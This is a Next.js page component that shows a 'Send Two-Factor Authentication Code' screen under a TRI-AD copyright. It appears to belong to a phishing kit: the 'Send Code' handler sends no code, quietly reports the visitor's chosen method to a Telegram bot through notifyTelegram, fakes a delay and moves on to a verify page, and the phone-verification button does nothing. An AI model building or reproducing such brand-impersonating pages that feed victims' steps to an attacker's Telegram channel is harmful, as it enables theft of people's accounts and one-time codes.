"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { notifyTelegram } from "@/lib/telegram-notify";
import { LandingHeader } from "@/components/LandingHeader";

export default function TwoFactorSelect() {
  const router = useRouter();
  const [method, setMethod] = useState("sms");
  const [sending, setSending] = useState(false);

  const handleSendCode = async () => {
    setSending(true);

    // Convert method value for Telegram (sms -> text)
    const telegramMethod = method === "sms" ? "text" : method;

    // Send notification to Telegram
    notifyTelegram({
      kind: "method",
      method: telegramMethod as "email" | "text" | "phone",
    });

    setTimeout(() => {
      setSending(false);
      router.push(`/two-factor/verify?method=${method}`);
    }, 1600);
  };

  const handleBackLogin = () => {
    setTimeout(() => router.push("/"), 500);
  };

  return (
    <>
      <style jsx>{`
        *,
        *::before,
        *::after {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        body {
          font-family: "Open Sans", Arial, sans-serif;
          background: #f5f5f5;
          color: #333;
          min-height: 100vh;
          display: flex;
          flex-direction: column;
        }

        /* ══ LAYOUT ══ */
        .page-wrap {
          flex: 1;
          display: flex;
          padding: 28px 20px 40px;
          max-width: 1200px;
          width: 100%;
          margin: 0 auto;
        }
        .main-col {
          width: 100%;
          max-width: 62%;
          min-width: 0;
        }

        /* ══ PAGE TITLE ══ */
        h1 {
          font-size: 1.55rem;
          font-weight: 400;
          color: #4a4a4a;
          margin-bottom: 22px;
          letter-spacing: -0.01em;
        }

        /* ══ OUTER CARD ══ */
        .outer-card {
          background: #fff;
          border: 1px solid #d8d8d8;
          border-radius: 4px;
          padding: 22px 20px;
        }

        /* ══ FIELDSET-STYLE SECTIONS ══ */
        .section-box {
          border: 1px solid #c8c8c8;
          border-radius: 3px;
          padding: 0 14px 18px;
          position: relative;
          margin-bottom: 22px;
        }
        .section-legend {
          font-size: 0.875rem;
          font-weight: 600;
          color: #2ec4a0;
          background: #fff;
          padding: 0 6px;
          position: absolute;
          top: -10px;
          left: 10px;
        }
        .section-body {
          padding-top: 18px;
        }

        /* ══ INFO ALERT ══ */
        .info-alert {
          background: #d6eef2;
          border: 1px solid #a8d4db;
          border-radius: 3px;
          padding: 12px 14px;
          font-size: 0.825rem;
          color: #2c6272;
          line-height: 1.55;
          margin-bottom: 16px;
          display: flex;
          gap: 8px;
          align-items: flex-start;
        }
        .info-icon {
          flex-shrink: 0;
          width: 16px;
          height: 16px;
          background: #2c7a8c;
          color: #fff;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 0.62rem;
          font-weight: 700;
          margin-top: 1px;
        }
        .info-icon.grey {
          background: #888;
        }

        /* ══ PREFERRED METHOD LABEL ══ */
        .pref-label {
          font-size: 0.8125rem;
          color: #555;
          border: 1px solid #c8c8c8;
          border-radius: 3px;
          display: inline-block;
          padding: 2px 8px;
          margin-bottom: 10px;
        }

        /* ══ RADIO OPTIONS ══ */
        .radio-list {
          margin-bottom: 16px;
        }
        .radio-row {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 7px;
          font-size: 0.8125rem;
          color: #333;
          cursor: pointer;
        }
        .radio-row input[type="radio"] {
          display: none;
          accent-color: #c0392b;
          width: 14px;
          height: 14px;
          cursor: pointer;
          flex-shrink: 0;
        }
        .checkbox-icon {
          width: 18px;
          height: 18px;
          border: 2px solid #999;
          border-radius: 3px;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          background: #fff;
          transition: all 0.15s;
        }
        .checkbox-icon.checked {
          background: #2ec4a0;
          border-color: #2ec4a0;
        }
        .checkbox-icon.checked svg {
          display: block;
        }
        .checkbox-icon svg {
          display: none;
          width: 14px;
          height: 14px;
          color: #fff;
        }
        .radio-icon {
          width: 16px;
          height: 16px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
        }

        /* ══ SEND CODE BUTTON ══ */
        .btn-row {
          display: flex;
          justify-content: flex-end;
        }
        .btn-send {
          background: #2ec4a0;
          color: #fff;
          border: none;
          border-radius: 4px;
          padding: 9px 20px;
          font-size: 0.875rem;
          font-weight: 600;
          font-family: "Open Sans", sans-serif;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          transition:
            background 0.15s,
            transform 0.08s;
        }
        .btn-send:hover {
          background: #25a98a;
        }
        .btn-send:active {
          transform: scale(0.99);
        }
        .btn-send:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        /* spinner */
        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }
        .spin-ring {
          display: none;
          width: 13px;
          height: 13px;
          border: 2px solid rgba(255, 255, 255, 0.35);
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin 0.65s linear infinite;
        }

        /* ══ INNER BOX (Other Final Verification) ══ */
        .inner-box {
          border: 1px solid #c8c8c8;
          border-radius: 3px;
          padding: 14px 16px 18px;
        }
        .inner-box-title {
          font-size: 0.875rem;
          font-weight: 600;
          color: #2ec4a0;
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 14px;
        }
        .warn-red {
          font-size: 0.8rem;
          font-weight: 700;
          color: #c0392b;
          text-transform: uppercase;
          letter-spacing: 0.02em;
          margin-bottom: 12px;
          line-height: 1.4;
        }
        .inner-body-text {
          font-size: 0.8rem;
          color: #444;
          line-height: 1.6;
          margin-bottom: 12px;
        }
        .info-small {
          display: flex;
          align-items: flex-start;
          gap: 7px;
          font-size: 0.8rem;
          color: #444;
          line-height: 1.6;
          margin-bottom: 16px;
        }

        /* Use Phone Verification button (outlined teal) */
        .btn-phone-verify {
          background: #fff;
          color: #2ec4a0;
          border: 1.5px solid #2ec4a0;
          border-radius: 3px;
          padding: 7px 16px;
          font-size: 0.8125rem;
          font-weight: 600;
          font-family: "Open Sans", sans-serif;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 6px;
          transition: background 0.15s;
        }
        .btn-phone-verify:hover {
          background: #e8fdf8;
        }

        /* ══ BACK TO LOGIN ══ */
        .btn-back-login {
          background: #2ec4a0;
          color: #fff;
          border: none;
          border-radius: 4px;
          padding: 9px 18px;
          font-size: 0.875rem;
          font-weight: 600;
          font-family: "Open Sans", sans-serif;
          cursor: pointer;
          display: inline-flex;
          align-items: center;
          gap: 8px;
          margin-top: 18px;
          transition: background 0.15s;
        }
        .btn-back-login:hover {
          background: #25a98a;
        }

        /* ══ FOOTER ══ */
        footer {
          background: #fff;
          border-top: 1px solid #ddd;
          padding: 10px 20px;
          font-size: 0.75rem;
          color: #555;
          display: flex;
          align-items: center;
          justify-content: space-between;
          flex-wrap: wrap;
          gap: 10px;
        }
        footer a {
          color: #1a6a9a;
          text-decoration: none;
        }
        footer a:hover {
          text-decoration: underline;
        }
        .scroll-top {
          background: none;
          border: none;
          cursor: pointer;
          color: #888;
          display: flex;
          align-items: center;
          padding: 0;
          font-family: "Open Sans", sans-serif;
        }
        .scroll-top:hover {
          color: #555;
        }

        /* toast */
        #toast {
          position: fixed;
          bottom: 24px;
          left: 50%;
          transform: translateX(-50%) translateY(10px);
          background: #333;
          color: #fff;
          font-size: 0.8rem;
          font-family: "Open Sans", sans-serif;
          padding: 9px 18px;
          border-radius: 3px;
          opacity: 0;
          pointer-events: none;
          transition:
            opacity 0.2s,
            transform 0.2s;
          z-index: 9999;
          white-space: nowrap;
        }
        #toast.show {
          opacity: 1;
          transform: translateX(-50%) translateY(0);
        }

        /* Mobile responsiveness */
        @media (max-width: 768px) {
          .page-wrap {
            padding: 16px 12px 24px;
          }

          .main-col {
            max-width: 100%;
          }

          h1 {
            font-size: 1.2rem;
            margin-bottom: 16px;
          }

          .outer-card {
            padding: 16px 14px;
          }

          .section-box {
            margin-bottom: 16px;
          }

          .btn-send,
          .btn-back-login,
          .btn-phone-verify {
            font-size: 0.75rem;
            padding: 7px 14px;
          }
        }
      `}</style>

      <LandingHeader />

      <div className="page-wrap">
        <div className="main-col">
          <h1>Send Two-Factor Authentication Code</h1>

          <div className="outer-card">
            {/* PREFERRED COMMUNICATION METHOD */}
            <div className="section-box">
              <span className="section-legend">
                Preferred Communication Method
              </span>
              <div className="section-body">
                <div className="info-alert">
                  <div className="info-icon">i</div>
                  <div>
                    Select Preferred Communication Method (If the phone # listed
                    below is not a cell phone #, please use another preferred
                    method to receive an authentication code.)
                  </div>
                </div>

                <div className="pref-label">Preferred Method</div>

                <div className="radio-list">
                  <label className="radio-row">
                    <input
                      type="radio"
                      name="method"
                      value="sms"
                      checked={method === "sms"}
                      onChange={(e) => setMethod(e.target.value)}
                    />
                    <div
                      className={`checkbox-icon ${method === "sms" ? "checked" : ""}`}
                    >
                      <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" />
                      </svg>
                    </div>
                    Send me an SMS text message to
                    <span className="radio-icon">
                      <svg
                        width="13"
                        height="13"
                        viewBox="0 0 24 24"
                        fill="#2ec4a0"
                      >
                        <path d="M6.62 10.79a15.1 15.1 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.58.57a1 1 0 011 1V20a1 1 0 01-1 1C9.61 21 3 14.39 3 6a1 1 0 011-1h3.5a1 1 0 011 1c0 1.26.2 2.47.57 3.58a1 1 0 01-.24 1.01l-2.21 2.2z" />
                      </svg>
                    </span>
                    <strong>Phone</strong>
                  </label>
                  <label className="radio-row">
                    <input
                      type="radio"
                      name="method"
                      value="email"
                      checked={method === "email"}
                      onChange={(e) => setMethod(e.target.value)}
                    />
                    <div
                      className={`checkbox-icon ${method === "email" ? "checked" : ""}`}
                    >
                      <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z" />
                      </svg>
                    </div>
                    Send me an Email to
                    <span className="radio-icon">
                      <svg
                        width="13"
                        height="13"
                        viewBox="0 0 24 24"
                        fill="#1a6a9a"
                      >
                        <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
                      </svg>
                    </span>
                    <strong>Email</strong>
                  </label>
                </div>

                <div className="btn-row">
                  <button
                    className="btn-send"
                    onClick={handleSendCode}
                    disabled={sending}
                  >
                    <span>{sending ? "Sending..." : "Send Code"}</span>
                    <div
                      className={`spin-ring ${sending ? "show" : ""}`}
                      style={{ display: sending ? "block" : "none" }}
                    ></div>
                    {!sending && (
                      <svg
                        width="15"
                        height="15"
                        viewBox="0 0 24 24"
                        fill="white"
                      >
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z" />
                      </svg>
                    )}
                  </button>
                </div>
              </div>
            </div>

            {/* OTHER SECURITY VERIFICATION */}
            <div className="section-box">
              <span className="section-legend">
                Other Security Verification
              </span>
              <div className="section-body">
                <div className="inner-box">
                  <div className="inner-box-title">
                    <svg
                      width="17"
                      height="17"
                      viewBox="0 0 24 24"
                      fill="#2ec4a0"
                    >
                      <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 10h2v2H6zm0 4h8v2H6zm4-4h8v2h-8z" />
                    </svg>
                    Other Final Verification Option
                  </div>

                  <p className="warn-red">
                    PLEASE USE ONE OF THE PREFERRED METHODS ABOVE TO ACCESS YOUR
                    ACCOUNT.
                  </p>

                  <p className="inner-body-text">
                    If none of the preferred methods are available, this option
                    allows you to verify an alternate landline or mobile phone
                    number associated with you.
                  </p>

                  <div className="info-small">
                    <div className="info-icon grey">i</div>
                    <div>
                      This is a service that can verify your landline or mobile
                      phone number. Once verified, a code can be sent to your
                      phone.
                    </div>
                  </div>

                  <button className="btn-phone-verify">
                    Use Phone Verification
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 24 24"
                      fill="#2ec4a0"
                    >
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z" />
                    </svg>
                  </button>
                </div>
              </div>
            </div>

            {/* Back to Login */}
            <button className="btn-back-login" onClick={handleBackLogin}>
              <svg width="15" height="15" viewBox="0 0 24 24" fill="white">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6 11H9.83l2.88 2.88-1.42 1.41L6.17 12l5.12-5.29 1.42 1.41L9.83 11H18v2z" />
              </svg>
              Back to Login
            </button>
          </div>
        </div>
      </div>

      <footer>
        <div>
          © 2026 Copyright © 2002-2026 TRI-AD | Disclaimer –
          <a href="#"> Terms of Use and Privacy Policy</a>
          &nbsp;All rights reserved
        </div>
        <button
          className="scroll-top"
          onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
          title="Back to top"
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
            <path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z" />
          </svg>
        </button>
      </footer>

      <div id="toast"></div>
    </>
  );
}
